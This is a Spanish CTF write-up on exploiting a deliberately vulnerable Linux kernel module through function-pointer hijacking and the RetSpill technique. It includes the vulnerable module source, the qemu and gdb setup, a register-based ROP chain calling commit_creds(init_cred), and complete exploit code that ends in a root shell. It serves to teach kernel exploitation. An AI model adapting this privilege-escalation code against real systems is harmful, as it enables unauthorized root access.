SpillMe

31 de March de 2026

Introduccion

En este reto se nos proporciona el zip SpillMe.zip con los siguientes achivos:

  • Una imagen de kernel comprimida: bzImage
  • Un sistema de archivos comprimido: rootfs.cpio.gz
  • Un script para iniciar qemu: run.sh
  • Un codigo de un modulo de kernel: vuln.c

Setup del Entorno

El Kernel de Linux

Lo primero que vamos a hacer el descomprimir el bzImage para tener la imagen del Kernel de Linux, yo lo hare con el script extract-image.sh

1

./extract-image.sh ./bzImage > vmlinux

Esto lo hacemos para poder debuggear despues, y para encontrar ROP gagdets. Para encontrar gadgets en imagenes de Kernel yo utilizo esta herramienta: kropr

1

kropr vmlinux > GADGETS.txt

El Sistema de Archivos

Para descomprimir el sistema de archivos ejecutaremos los siguientes comandos:

En la raiz nos encontramos el script init, con motivos de posterior debugging vamos a modificar una linea del script:

setsid cttyhack setuidgid 0 /bin/sh

Con esto lo que haremos es que al iniciar el sistema seamos el usuario root.

Cuando vayamos a probar nuestro exploit debemos cambiar esto otra vez a 1000 para ver si nos ha elevado los privilegios de verdad, y no caer en falsos positivos.

Para comprimir el sistema de archivos otra vez junto con nuestro exploit he usado el siguiente script:

#!/bin/sh

qemu-system-x86_64 \
    -kernel  bzImage      \
    -initrd  rootfs.cpio.gz \
    -nographic            \
    -monitor /dev/null    \
    -append "console=ttyS0 root=/dev/ram rdinit=/init oops=panic panic=-1 quiet nokaslr" \
    -m 128M               \
    -smp 2                \
    -cpu qemu64,+smep,+smap \
    -no-reboot            \
    -no-shutdown

Algunas flags a destacar son las siguientes:

  • -kernel especifica la imagen comprimida de kernel
  • -initrd especifica el sistema de archivos comprimido
  • -append especifica opciones adicionales del boot, aqui podemos ver que esta el KASLR descativado, y activado el Oops on Panic
  • -m especifica la memoria de la maquina virtual
  • -cpu especifica el modelo de cpu y algunas protecciónes habilitadas como SMAP y SMEP

Lo primero que vamos a hacer es agregarle la flag -s. Esta opción nos permite debuggear el kernel desde nuestra máquina host, abriendo el puerto 1234. Simplemente hay que ejecutar el siguiente comando en gdb una vez hayamos iniciado la máquina virtual

1

(gdb) target remote :1234

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/miscdevice.h>
#include <linux/workqueue.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Zereza");

#define VULN_WRITE   0xDEAD0001
#define VULN_EXEC    0xDEAD0002

static void (*fn_ptr)(void) = NULL;

static long vuln_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
{
    switch (cmd) {

    case VULN_WRITE: {
        uint64_t addr;
        if (copy_from_user(&addr, (void __user *)arg, sizeof(addr)))
            return -EFAULT;
        fn_ptr = (void (*)(void))addr;
        return 0;
    }

    case VULN_EXEC: {
        if(arg != 0){
          return -EFAULT;
        }

        if(fn_ptr) fn_ptr();
        return 0;
    }

    default:
        return -EINVAL;
    }
}

static int      vuln_open   (struct inode *i, struct file *f) { return 0; }
static int      vuln_release(struct inode *i, struct file *f) { return 0; }

static const struct file_operations vuln_fops = {
    .owner          = THIS_MODULE,
    .open           = vuln_open,
    .release        = vuln_release,
    .unlocked_ioctl = vuln_ioctl,
};

static struct miscdevice vuln_dev = {
    .minor = MISC_DYNAMIC_MINOR,
    .name  = "vuln",
    .fops  = &vuln_fops,
};

module_misc_device(vuln_dev);

Podemos observar la funcion vuln_ioctl que admite dos comandos:

  1. VULN_WRITE: Este nos deja escribir 8 bytes en la variable global fn_ptr
  2. VULN_EXEC: Comprueba que arg sea 0 (Esto se hace para no tener control sobre los registros), y ejecuta como funcion fn_ptr

¡Tenemos Control Flow Hijack (CFH)!, pero… ¿como pasamos de esto a escalar privilegios?

Podemos ejecutar la funcion que queramos, pero no tenemos control de los argumentos por lo que no podemos hacer commit_creds(init_cred) o algo similar.

Tampoco podemos hacer un ret2user porque tenemos Supervisor Mode Execution Protection (SMEP), lo que hace que las paginas de Userland no sean ejecutables desde modo Kernel

Además no tenemos control sobre los registros ni capacidad de escritura para poder pivotar a una ROP Chain de manera convencional.

RetSpill

RetSpill permite transformar un CFH limitado en Kernel en una primitiva más potente aprovechando cómo el kernel maneja el stack.

Podeís encontrar mas informacion sobre esta técnica aqui: RetSpill

Lo que conseguimos con esta técnica es aprovecharnos de que al hacer una syscall, el Kernel guarda la estructura pt_regs con nuestros registros de Userland en el stack

Podemos escribir nuestra ROP Chain en los registros antes de llamar a la syscall y pivotar con un gadget add rsp, X ; ret

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>

#define VULN_WRITE 0xDEAD0001
#define VULN_EXEC 0xDEAD0002

void trigger_retspill(int fd){
  ulong r15 = 0x4141414141414141;
  ulong r14 = 0x4242424242424242;
  ulong r13 = 0x4343434343434343;
  ulong r12 = 0x4444444444444444;
  ulong r11 = 0x4545454545454545;
  ulong r10 = 0x4646464646464646;
  ulong r9 = 0x4747474747474747;
  ulong r8 = 0x4848484848484848;
  ulong rbx = 0x4949494949494949;

  ulong rax = SYS_ioctl;
  ulong rdi = fd;
  ulong rsi = VULN_EXEC;
  ulong rdx = 0;

  __asm__ volatile (
      "syscall"
      : "+b"(rbx), "+r"(r15), "+r"(r14), "+r"(r13), "+r"(r12), "+r"(r10), "+r"(r9), "+r"(r8)
      : "a"(rax), "D"(rdi), "S"(rsi), "d"(rdx)
      : "rcx", "memory"
      );
}

int main(){
  ulong fn_ptr = 0xdeadbeefdeadbeef;
  int fd = open("/dev/vuln", O_RDWR);
  if(fd<0){
    puts("ERROR");
    exit(-1);
  }

  ioctl(fd, VULN_WRITE, &fn_ptr);
  trigger_retspill(fd);

  return 0;
}

Aquí vemos que no tenemos ningun tipo de control sobre los registros.

Observamos el estado del stack en gdb

¡Ahí están nuestros registros de Userland! El offset del RSP al primer registro es de 0x80

Es importante que miremos donde apunta el RSP en el Kernel Panic, y no en gdb

El siguiente paso es buscar un gadget de tipo add rsp, X ; ret que nos pivote a esa zona. Con el dump que nos dio kropr anteriormente encontramos este gadget:

1

0xffffffff81f8430d: add rsp, 0x78; pop rbx; ret;

Al estar desactivado el Kernel Address Space Layout Randomization (KASLR), esta dirección no cambia, al igual pasa con el resto de gadgets que usaremos en la ROP Chain, si estuviera activada esta protección habria que conseguir un LEAK

Montando la ROP Chain

Ya teniendo el orden en el que aparecen los registros en el stack y teniendo nuestro gadget para pivotar vamos a montar la ROP Chain.

Al estar en Kernel Mode deberemos asegurarnos de volver de forma segura a Userland después de escalar privilegios, al no tener suficiente espacio en el stack para usar un KPTI Trampoline volveré usando la técnica Telefork, esta tecnica se basa en usar un do_sys_fork y un msleep para volver a Userland. Al volver con esta técnica me causaba un SIGSEGV, asi que crearé un handler.

Para la ROP Chain haremos lo siguiente:

commit_creds(init_cred); do_sys_fork(); msleep(big_number)

y nos quedaría la siguiente ROP Chain:

pop rdi; ret
init_cred
commit_creds
pop rdi; ret
pop rsi; ret
do_sys_fork
msleep

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <signal.h>
#include <unistd.h>

#define VULN_WRITE 0xDEAD0001
#define VULN_EXEC 0xDEAD0002

#define ADD_RSP_0X78_POP1_RET 0xffffffff81f8430d
#define POP_RDI_RET 0xffffffff8229a95d
#define POP_RSI_RET 0xffffffff8229aa15

#define COMMIT_CREDS 0xffffffff813357d0
#define INIT_CRED 0xffffffff82c0f5c0
#define DO_SYS_FORK 0xffffffff812fc4f0
#define MSLEEP 0xffffffff813c2e90

void get_shell(int sig){
  if(getuid() == 0){
    puts("UID: 0");
    puts("GETTING SHELL...");
    system("/bin/sh");
  }
  printf("UID: %d\n", getuid());
  exit(-1);
}

void trigger_retspill(int fd){
  ulong r15 = POP_RDI_RET; // 1 POS
  ulong r14 = INIT_CRED; // 2 POS
  ulong r13 = COMMIT_CREDS; // 3 POS
  ulong r12 = POP_RDI_RET; // 4 POS
  ulong rbx = POP_RSI_RET; // 6 POS
  ulong r10 = DO_SYS_FORK; // 8 POS
  ulong r9 = MSLEEP; // 9 POS
  ulong r8 = 0x4848484848484848; // 10 POS
  ulong r11 = 0x4545454545454545;

  ulong rax = SYS_ioctl;
  ulong rdi = fd;
  ulong rsi = VULN_EXEC;
  ulong rdx = 0;

  __asm__ volatile (
      "syscall"
      : "+b"(rbx), "+r"(r15), "+r"(r14), "+r"(r13), "+r"(r12), "+r"(r11), "+r"(r10), "+r"(r9), "+r"(r8)
      : "a"(rax), "D"(rdi), "S"(rsi), "d"(rdx)
      : "rcx", "memory"
      );
}

int main(){
  signal(SIGSEGV, get_shell);
  ulong fn_ptr = ADD_RSP_0X78_POP1_RET;
  int fd = open("/dev/vuln", O_RDWR);
  if(fd<0){
    puts("ERROR");
    exit(-1);
  }

  ioctl(fd, VULN_WRITE, &fn_ptr);
  trigger_retspill(fd);

  return 0;
}
